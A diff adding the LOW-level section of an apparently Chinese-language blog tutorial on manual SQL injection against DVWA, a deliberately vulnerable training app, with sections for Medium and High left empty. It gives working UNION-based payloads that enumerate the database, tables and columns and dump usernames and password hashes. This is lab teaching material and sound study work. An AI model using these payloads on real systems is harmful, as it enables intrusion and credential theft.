@@ -251,13 +251,80 @@
             <h1 id="DVWA-SQL注入"><a href="#DVWA-SQL注入" class="headerlink" title="DVWA - SQL注入"></a>DVWA - SQL注入</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
 <li>建议手工注入，可以了解 sql注入 的过程和原理。</li>
 <li>不建议使用工具比如说 sqlmap 来进行数据库的爆破。</li>
+<li>手工注入步骤：<ul>
+<li>1.找注入点</li>
+<li>2.构造注入内容 </li>
+</ul>
+</li>
 </ul>
 <hr>
 <p><strong>强烈建议：</strong>在 docker 上配置 LAMP 环境来搭建靶场，会方便许多，dvwa 是在本地开启的，在本地 windows（ mac 我不知道） 上配置环境会很麻烦。</p>
 <hr>
 <p><strong>参考：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://m3lon.github.io/2018/04/02/%E5%9F%BA%E7%A1%80%E7%AF%87-DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/">https://m3lon.github.io/2018/04/02/%E5%9F%BA%E7%A1%80%E7%AF%87-DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/</a></p>
 <hr>
-<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/1.png" alt="1"></p>
+<hr>
+<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><ul>
+<li><p>判断是否存在注入，注入是<strong>字符型</strong>还是<strong>数字型</strong></p>
+<p>字符型和数字型的区别在于是否存在引号，所以我们输入 <strong>1</strong>  进行注入</p>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/3.png" alt="3"></p>
+<p>再输入 <strong>1’</strong>  进行注入</p>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/2.png" alt="2"></p>
+</li>
+</ul>
+<p>​    根据回显我们可以看出，id 为注入点，而且属于字符型注入。</p>
+<ul>
+<li><p>这样我们就可以通过在语句后面加上注释符可以构造payload来绕过。</p>
+</li>
+<li><p>猜解 SQL 查询语句中的<strong>字段数</strong></p>
+<p>因为要想爆破数据库，就必须通过 Union 查询</p>
+<p>[^一次性查询多条 SQL语句，并将每一条查询语句的结果合并成一个结果集，就需要用到 Union 操作符，这种查询被称为并（union）查询联合查询。类似于连接符 ‘ &amp; ‘ 和管道符 ‘ | ‘]: </p>
+<p>联合查询适用于两种情况：</p>
+<ul>
+<li>从多个表中查询出相似结构的数据，并且<strong>返回一个结果集</strong></li>
+<li>从单个表中多次SELECT查询，将结果<strong>合并成一个结果集</strong>返回。</li>
+</ul>
+<p>所以就要查询 “ 字段数 “，通过 “ order by “ 判断前一个  select 语句的字段数，输入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3 #</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/4.png" alt="4"></p>
+</li>
+</ul>
+<p>​        猜测 3 的时候报错！！说明字段数为 2</p>
+<ul>
+<li><p>输入 “ <strong>1’ union select 1,2 #</strong> “</p>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/5.png" alt="5"></p>
+</li>
+<li><p>输入” <strong>1’ union select database(),2 #</strong> “，可知数据库名称为 <strong>dvwa</strong></p>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/6.png" alt="6"></p>
+</li>
+<li><p>获取数据库中的<strong>表名</strong></p>
+<ul>
+<li><p>每一个 mysql 都存在一个系统库 <strong>information_schema</strong> ，所以我们可以构造 payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select table_name,2 from information_schema.tables where table_schema=&#x27;</span>dvwa<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
+
+<p>得到数据库中有两张表，<strong>guestbook</strong> 和 <strong>users</strong> 。</p>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/7.png" alt="7"></p>
+</li>
+</ul>
+</li>
+<li><p>获取表中的<strong>字段名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select column_name,2 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到有很多的字段，最有用的应该是 <strong>user</strong> 和 <strong>password</strong></p>
+<img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/9.png" alt="9.png" style="zoom:70%;"></li>
+<li><p>查找数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select user,password from users #</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA-SQL%E6%B3%A8%E5%85%A5/9.png" alt="9"></p>
+</li>
+<li><p>MD5 解密</p>
+</li>
+</ul>
+<hr>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><hr>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2>
         </div>
 
         
